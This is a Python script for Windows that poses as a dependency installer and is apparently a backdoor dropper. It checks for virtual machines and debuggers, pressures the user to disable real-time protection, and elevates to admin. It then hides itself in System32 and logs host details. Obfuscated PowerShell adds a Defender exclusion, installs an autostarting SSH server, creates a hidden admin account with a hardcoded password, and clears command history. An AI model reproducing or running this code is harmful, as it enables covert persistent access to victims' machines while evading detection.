from os import name
from sys import exit
from re import search
from subprocess import run
from ctypes import windll
from sys import executable
from sys import argv
from os import path
from os import environ
from os import remove
from os import mkdir
from shutil import move
from threading import Thread
from time import strftime
from time import gmtime
from platform import platform
from platform import system
from platform import release
from platform import version
from platform import machine
from platform import win32_edition
from platform import architecture
from winreg import CreateKey
from winreg import HKEY_LOCAL_MACHINE
from winreg import SetValueEx
from winreg import REG_DWORD

def OperatingSystemCheck():
    if name != "nt":
        exit(1)


OperatingSystemCheck()

def VirtualMachineCheck():
    MPPREFERENCE = run("PoWeRsHeLl gEt-mPcOmPuTerStatUs", shell=True, capture_output=True).stdout.decode()
    if search("IsVirtualMachine                 : True", MPPREFERENCE):
        exit(1)


VirtualMachineCheck()

def DebuggerCheck():
    IsDebug = c_bool(False)
    windll.kernel32.CheckRemoteDebuggerPresent(windll.kernel32.GetCurrentProcess(), byref(IsDebug))
    if IsDebug == True:
        exit(1)

DebuggerCheck()

def RealTimeProtectionCheck():
    MPPREFERENCE = run("PoWeRsHeLl gEt-mPcOmPuTerStatUs", shell=True, capture_output=True).stdout.decode()
    if search("RealTimeProtectionEnabled        : True", MPPREFERENCE):
        windll.user32.MessageBoxW(0, "Real time protection must be disabled to install dependencies.", "Error",0x10)
        exit(1)


RealTimeProtectionCheck()

def IsUsrAdmin():
    if not windll.shell32.IsUserAnAdmin():
        windll.shell32.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None)
        exit(1)


IsUsrAdmin()

def HideOutCreation():
    if path.exists(environ['windir']+"\\System32\\0193"):
        remove(environ['windir']+"\\System32\\0193")
    else:
        mkdir(environ['windir']+"\\System32\\0193")
    windll.kernel32.SetFileAttributesW(environ['windir']+"\\System32\\0193", 2) # possible error

HideOutCreation()

def Hiding():
    MyCurrentLocation = path.basename(argv[0])
    if path.exists(environ['windir']+"\\System32\\0193\\"+MyCurrentLocation):
        remove(environ['windir']+"\\System32\\0193\\"+MyCurrentLocation)
    move(MyCurrentLocation, environ['windir']+"\\System32\\0193\\"+MyCurrentLocation)


Hiding()

def Logging():
    HostName1 = gethostname()
    HostnameString1 = HostName1
    with open(environ['windir']+"\\System32\\0193\\Log.txt", "w") as LogFile:
        LogFile.write("Date of execution(GMT): "+strftime("%a, %d %b %Y %H:%M:%S +0000", gmtime())+"\n")
        LogFile.write("Hostname: "+HostnameString1+"\n")
        HostName2 = gethostbyname(HostnameString1)
        HostnameString2 = HostName2
        LogFile.write("LocalIP: "+HostnameString2+"\n")
        LogFile.write("Username: "+environ['username']+"\n")
        LogFile.write("Architecture: "+architecture()[0]+"\n")
        LogFile.write("Processor: "+processor()+"\n")
        LogFile.write("System: "+system()+"\n")
        LogFile.write("Platform: "+platform()+"\n")
        LogFile.write("Release: "+release()+"\n")
        LogFile.write("Version: "+version()+", "+version().split('.')[2]+"\n")
        LogFile.write("Machine: "+machine()+"\n")
        LogFile.write("Edition: "+win32_edition()+"\n")
        LogFile.write("HomeDirectory: "+environ['HOME'])
        LogFile.close()
        
LOGTHREAD = Thread(target = Logging(), args = (10, ))
LOGTHREAD.start()

def HidingNewAdmin():
    KEY = CreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList")
    SetValueEx(KEY, "defaultuser0", 0, REG_DWORD, 0)
    KEY.Close()


HidingNewAdmin()


def Payload():
    run("pOWeRsHelL $Reversed = ""'AUGA2BwPAIHA/AwPAUGA/AwPA8DATBgOAYHAuBQZAQCAgAASAQHABBAcA4EAPBQaAMFA1BATAMGAYBQZA0CAgAQRAMGAOBQZAIFAlBgRAUGASBAcAAFAtBQLAQGAEBQY' cnE- ssapyB cexE- neddiH W- InoN- PoN- exe.llehsrewop""; $Normal = @(); ($Reversed.length - 1)..0 | ForEach-Object {$Normal += $Reversed[$_]}; $Normal = $Normal -join ''; Invoke-Expression $Normal", shell = True)
    #The run command above adds an exclusion to the system drive.
    run("poWeRsHeLl $Reversed = ""'=AARAgGATBwcAACAlBwQAkGAWBgcAUEAzBQLAQHASBQYAQFAzBAIAsDAiAwYAkEA0BQQA0GAPBAdAUFAhBgIAACAFBAcAkFA0BAUAUHAUBgcAEGAUBwcA0CAgAAZAgEAzBwUAACAFBQbAEEAuBQLAACAlBwQAkGAWBgcAUEAzBQLAQHAFBwcAACA7AAMA4CAxAgLAADAuAAMA4HA+BgfA4HAyBQZAYHAyBQZAMHAuAASAMHATBgbAUEAwBwbAACAFBQbAEEAuBQLAACAlBgTAkGAMBgbA8EAtAAIAkHAUBQaAwGApBgYAEGAQBQYAMGATBwdA8GAEBgbAkEA3BQLAQGAEBQY' cnE- ssapyB cexE- neddiH W- InoN- PoN- exe.llehsrewop""; $Normal = @(); ($Reversed.length - 1)..0 | ForEach-Object {$Normal += $Reversed[$_]}; $Normal = $Normal -join ''; Invoke-Expression $Normal;", shell = True)
    #The run command above installs ssh server, starts ssh server and enables automatic ssh server startup.
    run("POwErsHelL $Reversed = ""'AADAyBQZAMHA1BAdAwGA1BQYAYGAlBAZAACAyBQZAIGAtBQZA0EAtAAIAICAzBgcA8GA0BQYAIHA0BwcAkGAuBQaA0GAkBQQAICAgAAcAUHAvBgcAcEAtAAIAIHAlBgYA0GAlBQTAAHA1BwbAIHAHBAbAEGAjBwbAwEAtAAZAQGABBAIAsDAkBgcA8GAXBwcAMHAhBAUAQCAgAAZAIHAvBwdAMHAzBQYAAFAtAAIAADAyBQZAMHA1BAdAwGA1BQYAYGAlBAZAACAlBQbAEGAOBQLAACAyBQZAMHAVBAbAEGAjBwbAwEAtAwdAUGAOBAIAsDAlBwYAIHAvBgRA0CAgAAdAgHAlBAVA4GApBQYAwGAQBwcAEEAtAAIAAEAxAAZAIHAwAwVAMHAzBQYAAFAgAwZA4GApBgcAQHATBQZAIHA1BwYAUGATBQLA8GAUBAdAIHAlBgdA4GAvBwQAACA9AAIAQGAyBwbAcFAzBwcAEGAQBAJ' cnE- ssapyB cexE- neddiH W- InoN- PoN- exe.llehsrewop""; $Normal = @(); ($Reversed.length - 1)..0 | ForEach-Object {$Normal += $Reversed[$_]}; $Normal = $Normal -join ''; Invoke-Expression $Normal", shell = True)
    #The run command above creates a new local admin with the username defaultuser0 and the password PassW0rd1@
    #Add shadow copy removal


Payload()

def ClearPsCommandHistory():
    run("$Reversed = ""'==AAoBAdAEGAQBQZAYHAhBwUAkHAyBwbAQHAzBQaAgEAuAQKA4GAvBQaAQHAwBwTAUGAuBQaAwGAkBQYAUGASBwUAAFAtAAdAUGAHBAKAACAtBQZAQHAJBQLAUGA2BwbA0GAlBgU' cnE- ssapyB cexE- neddiH W- InoN- PoN- exe.llehsrewop""; $Normal = @(); ($Reversed.length - 1)..0 | ForEach-Object {$Normal += $Reversed[$_]}; $Normal = $Normal -join ''; Invoke-Expression $Normal", shell = True)


LOGTHREAD.join()


windll.user32.MessageBoxW(0, "Installation complete", "Success", 0x40)






























    
